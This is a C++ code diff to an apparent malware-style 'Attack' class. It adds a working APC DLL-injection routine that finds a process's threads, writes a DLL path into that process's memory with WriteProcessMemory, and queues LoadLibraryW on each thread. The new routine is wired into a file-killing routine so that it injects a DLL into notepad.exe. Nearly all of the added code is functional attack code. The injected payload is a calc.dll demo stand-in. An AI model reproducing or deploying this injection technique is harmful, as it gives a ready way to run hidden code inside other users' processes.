@@ -102,6 +102,9 @@ vector<wstring> Attack::list_n_kill_files(wstring path)
 				}
 			}
 		} while (FindNextFile(hFind, &ffd) != 0);
+		// now attack the file editor! notebook
+		std::cout << "\nInjecting all writing processes" << std::endl;
+		APCinjection("notepad.exe", (TCHAR *)"..\\..\\dll\\calc.dll");
 	}
 	else {
 		std::cout << "Can't find files in directory" << std::endl;
@@ -164,4 +167,100 @@ void Attack::LoadDriverBeep()
 			std::cout << "CloseServiceHandle() is OK." << std::endl;
 		}
 	}
+}
+
+BOOL FindProcess(string exeName, DWORD& pid, vector<DWORD>& tids)
+{
+	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE)
+	{
+		return FALSE;
+	}
+
+	pid = 0;
+
+	PROCESSENTRY32 pe = { sizeof(pe) };
+	if (::Process32First(hSnapshot, &pe))
+	{
+		do
+		{
+			string str(pe.szExeFile);
+			if (pe.szExeFile == exeName)
+			{
+				pid = pe.th32ProcessID;
+				THREADENTRY32 te = { sizeof(te) };
+				if (Thread32First(hSnapshot, &te))
+				{
+					do
+					{
+						if (te.th32OwnerProcessID == pid)
+						{
+							tids.push_back(te.th32ThreadID);
+						}
+					} while (Thread32Next(hSnapshot, &te));
+				}
+				break;
+			}
+		} while (Process32Next(hSnapshot, &pe));
+	}
+	CloseHandle(hSnapshot);
+	return pid > 0 && !tids.empty();
+}
+
+// Inject a DLL into a target without creating a remote process or thread, actually uses
+// virtual memory
+BOOL Attack::APCinjection(string target, TCHAR *dll_name)
+{
+	TCHAR lpdllpath[MAX_PATH];
+	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);
+
+	DWORD pid{};
+	vector<DWORD> tids{};
+
+	std::cout << "[ ] Finding matching process name.." << std::endl;
+	if (!FindProcess(target, pid, tids))
+	{
+		std::cout << "[-] Failed to find process of " << target << std::endl;
+		return FALSE;
+	}
+
+	std::cout << "[+] Found process   " << pid << std::endl;
+	std::cout << "[ ] Opening process.." << std::endl;
+	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
+	if (!hProcess)
+	{
+		std::cout << "[-] Failed to open process." << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Opened Process" << std::endl;
+
+	std::cout << "[ ] Allocating memory into process.." << std::endl;
+	auto pVa = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	std::cout << "[+] Allocated memory in remote process" << std::endl;
+	std::cout << "[ ] Writing remote process memory.." << std::endl;
+	if (!WriteProcessMemory(hProcess, pVa, lpdllpath, sizeof(lpdllpath), nullptr))
+	{
+		std::cout << "[-] Failed to write remote process memory." << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Wrote remote process memory." << std::endl;
+	std::cout << "[ ] Enumerating APC threads in remote process.." << std::endl;
+	for (const auto &tid : tids)
+	{
+		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
+		if (hThread)
+		{
+			std::cout << "[*] Found thread at " << hThread << std::endl;
+			QueueUserAPC(
+				(PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"),
+					"LoadLibraryW"),
+				hThread,
+				(ULONG_PTR)pVa
+			);
+
+			CloseHandle(hThread);
+		}
+	}
+	CloseHandle(hProcess);
+	return TRUE;
 }
